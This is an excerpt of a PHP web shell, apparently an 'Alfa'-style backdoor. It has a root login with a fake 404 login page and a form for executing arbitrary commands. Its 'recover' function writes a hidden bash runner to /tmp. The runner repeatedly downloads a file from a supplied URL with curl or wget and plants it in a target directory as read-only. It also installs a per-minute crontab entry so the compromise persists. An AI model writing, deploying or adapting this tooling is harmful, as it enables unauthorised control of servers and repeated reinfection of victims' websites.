...
'username' => 'root',
'password' => '3cad96982b7aef9b8774627962ef9ed3',
'safe_mode' => '1',
'login_page' => '404',
'show_icons' => '',
...
function geckoBypassRecover($dirPath, $fileName, $downloadUrl, $wantPersist = false)
{
    ...
    $instanceId = substr(md5($dirPath . '|' . $fileName . '|' . $downloadUrl), 0, 8);
    $runner = $tmp . '/.gecko_bp_r_' . $instanceId;
    $persist = $wantPersist ? '1' : '0';

    $dq = geckoBashQuote($dirPath);
    $fq = geckoBashQuote($fileName);
    $uq = geckoBashQuote($downloadUrl);
    $rq = geckoBashQuote($runner);
    ...
    $sh = "#!/bin/bash\n"
        ...
        . "while true; do\n"
        . "  if [ ! -s \"\$DEST\" ]; then\n"
        . "    T=\$(mktemp /tmp/.grec_XXXXXX 2>/dev/null || echo /tmp/.grec_\$\$)\n"
        . "    curl -fsSL --max-time 40 \"\$URL\" -o \"\$T\" 2>/dev/null || wget -qO \"\$T\" \"\$URL\" 2>/dev/null || true\n"
        . "    if [ -s \"\$T\" ]; then mv -f \"\$T\" \"\$DEST\"; chmod 444 \"\$DEST\" 2>/dev/null || true; else rm -f \"\$T\"; fi\n"
        . "  fi\n"
        . "  sleep 60\n"
        . "done\n"
        . "EOS\n"
        ...
        . "  echo \"GECKO_PERSIST_PID:\$!\"\n"
        . "  CRON_LINE=\"* * * * * \$RUNNER >/dev/null 2>&1\"\n"
        . "  (crontab -l 2>/dev/null | grep -vF \"\$RUNNER\"; echo \"\$CRON_LINE\") | crontab - 2>/dev/null && echo GECKO_PERSIST_CRON:OK || echo GECKO_PERSIST_CRON:FAIL\n"
        . "fi\n"
    ...
    $cmd = '/bin/bash ' . geckoBashQuote($script);
    ...
    $pid = 0;
    if (preg_match('/GECKO_PERSIST_PID:(\d+)/', $output, $m)) {
        $pid = (int)$m[1];
    }
    $cronOk = (strpos($output, 'GECKO_PERSIST_CRON:OK') !== false);
    ...
    if (empty($r['ok']) && !$ok) {
        return array(
            ...
            'pid' => $pid,
            'crontab' => $cronOk,
            'install_path' => $wantPersist ? $runner : '',
            'output' => $output,
...
echo '<div class="txtfont" style="opacity:.85;margin-bottom:6px;">engine: '.(function_exists('geckoBypassRun') && function_exists('geckoBypassRecover') ? 'cmd+recover OK' : 'NOT LOADED — re-upload header.php').'</div>';
...
echo '<div class="txtfont">Mode: <select name="mode" id="gecko_bp_mode" onchange="geckoBpToggle(this.value)"><option value="cmd">Execute command</option><option value="recover">Recovery (via preload)</option></select><br>';
echo '<span id="gecko_bp_cmd_row">CMD: <input size="55" type="text" name="cmd" id="gecko_bp_cmd" value="id"><br></span>';
echo '<span id="gecko_bp_rec_row" style="display:none">DIR_PATH: <input size="55" type="text" name="dir" value="'.$cwdEsc.'"><br>';
echo 'FILE_NAME: <input size="30" type="text" name="file" value="index.php"><br>';
echo 'DOWNLOAD_URL: <input size="55" type="text" name="url" value=""><br>';
echo 'Persist: <select name="persist"><option value="1">ON (daemon+crontab)</option><option value="0">OFF (one-shot)</option></select><br></span>';
echo '<input type="submit" value=" Run "></div></form></center>';
echo '<script type="text/javascript">
function geckoBpToggle(m){
var cmd=document.getElementById("gecko_bp_cmd_row");
var rec=document.getElementById("gecko_bp_rec_row");
if(!cmd||!rec)return;
if(m==="recover"){cmd.style.display="none";rec.style.display="";}
else{cmd.style.display="";rec.style.display="none";}
}
(function(){
var sel=document.getElementById("gecko_bp_mode");
if(sel)geckoBpToggle(sel.value);
})();
</script>';
if (isset($_POST['alfa7']) && $_POST['alfa7'] === '>>') {
    ...
    if ($mode === 'recover') {
        if (!function_exists('geckoBypassRecover')) {
            echo __pre().'<b>Preload recover missing (embed failed). Re-upload latest header.php.</b>';
        } else {
            ...
            if ($wantPersist) {
                ...
                if (!empty($r['install_path'])) echo 'runner: '.htmlspecialchars((string)$r['install_path'])."\n";
            }
